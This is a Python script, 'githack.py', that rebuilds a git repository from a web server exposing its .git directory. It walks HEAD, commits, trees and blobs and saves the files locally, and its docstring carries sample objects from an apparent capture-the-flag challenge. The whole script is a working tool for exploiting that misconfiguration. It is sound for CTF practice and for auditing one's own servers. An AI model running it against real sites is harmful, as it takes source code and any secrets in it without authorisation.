"""
Author: Haozhe Zhang

Each commit has a folder.
  Commit_hash
  \_ commit info_hash
  \_ file_1 extracted from blob_1
  \_ file_2 extracted from blob_2

data example. for development only.
commit:
    b'commit 210\x00tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
    parent 912133f7bd228e96757a531ef52d1777de10ca8a
    author Alice <xxx@qq.com> 1554748133 +0800
    committer Alice <xxx@qq.com> 1554748133 +0800

    delete flag'

tree:
    b'tree 0\x00'

    b"tree 32\x00100644 flag\x00'0\xedavmI\x048\xad\x80\xe0\x7f\xec\x85|\x83\xfbB\xb3"

blob:
    b'blob 37\x00WHUCTF{Y0u_Kn0w_G1t_And_Y0u_F1nd_Me}\n'
"""

import binascii
import http.client
import os
import re
import sys
import urllib.parse
import urllib.request
import zlib


class GitHacker:
    def __init__(self, url: str):
        self.base_url = url
        self.workpath = urllib.parse.urlparse(url).netloc.replace(':', '_')

    def _request(self, url: str) -> http.client.HTTPResponse:
        """
        Make request with certain headers.
        :param url: str
        :return: http.client.HTTPResponse
        """
        self.request = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        try:
            return urllib.request.urlopen(self.request, timeout=10)
        except Exception as e:
            print(e)
            exit(-1)

    def get_head_hash(self):
        """
        Get HEAD commit hash.
        :return:
        """
        print('[*] Start to fetch HEAD hash')

        # Retrieve HEAD hash.
        ref_url = '{base_url}HEAD'.format(base_url=self.base_url)
        head_file = self._request(ref_url).read().strip().decode().split(': ')[1]
        head_url = '{base_url}{head_file}'.format(base_url=self.base_url, head_file=head_file)
        head_hash = self._request(head_url).read().strip().decode()

        print('[+] Starting at commit {}'.format(head_hash))
        if not os.path.exists(self.workpath):
            os.mkdir(self.workpath)
        return head_hash

    def analyze_blob_hash(self, name: str, blob_hash: str, commit_hash: str):
        """
        Analyze blob with the given hash
        :param name:
        :param blob_hash:
        :param commit_hash:
        :return:
        """
        print('[+] Analyzing blob {} -> {}'.format(commit_hash, blob_hash))

        file_name = '{workspace}/commit_{hash_str}/{name}'.format(workspace=self.workpath, hash_str=commit_hash,
                                                                  name=name)
        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=blob_hash[:2], fi=blob_hash[2:])
        data = self._request(url).read()
        data = zlib.decompress(data)

        if data[:4] == b'blob':
            data = re.sub(r'blob \d+\00', '', data.decode())
            with open(file_name, 'wb') as fp:
                fp.write(data.encode())

    def analyze_tree_hash(self, tree_hash: str, commit_hash: str):
        """
        Analyze tree with the given hash. It has been confirmed to be a tree node hash.
        :param tree_hash:
        :param commit_hash:
        :return:
        """
        print('[+] Analyzing tree {} -> {}'.format(commit_hash, tree_hash))

        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=tree_hash[:2], fi=tree_hash[2:])
        data = self._request(url).read()
        data = zlib.decompress(data)

        # Parse the data and extract blob hash, then call analyze_blob_hash().
        if data[:4] == b'tree':
            split_tree = data.split('100644 '.encode())
            for i in range(1, len(split_tree)):
                t_name, hash_str = split_tree[i].split(b'\x00')
                t_name = t_name.decode()
                hash_str = binascii.b2a_hex(hash_str).decode()

                self.analyze_blob_hash(t_name, hash_str, commit_hash)

    def analyze_commit_hash(self, hash_str: str):
        """
        Analyze commit with the given hash. It has been confirmed the hash belongs to a commit node.
        Create a folder for the files involved in this commit.
        Find tree hashes and parent hashes in the data.
        :param hash_str:
        :return:
        """
        # request
        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=hash_str[:2], fi=hash_str[2:])
        data = self._request(url).read()
        data = zlib.decompress(data)

        # commit
        if data[:6] == b'commit':
            # create commit folder and save commit message.
            folder_name: str = '{workspace}/commit_{hash_str}'.format(workspace=self.workpath, hash_str=hash_str)
            if not os.path.exists(folder_name):
                os.mkdir(folder_name)
            with open('{folder}/commit_info_{hash_str}.txt'.format(folder=folder_name, hash_str=hash_str), 'w') as fp:
                fp.write(data.decode())

            # read commit - tree
            if data.find(b'tree') != -1:
                tree_hash_idx = data.find(b'tree') + 5
                tree_hash_str = data[tree_hash_idx: tree_hash_idx + 40].decode()
                self.analyze_tree_hash(tree_hash_str, hash_str)

            # read commit - parent (another commit. recursion here.)
            if data.find(b'parent') != -1:
                parent_hash_idx = data.find(b'parent') + 7
                parent_hash_str = data[parent_hash_idx: parent_hash_idx + 40].decode()
                self.analyze_commit_hash(parent_hash_str)
        else:
            print('[!] Fatal Error!')

    def run(self):
        commit_hash = self.get_head_hash()
        self.analyze_commit_hash(commit_hash)
        print('[*] Finished. Please check the folder {}'.format(self.workpath))


def main():
    if len(sys.argv) == 1:
        print('[Usage] python3 githack.py http://target.com/.git/')
        exit(0)

    url = sys.argv[1]
    hacker = GitHacker(url)
    hacker.run()


if __name__ == '__main__':
    main()
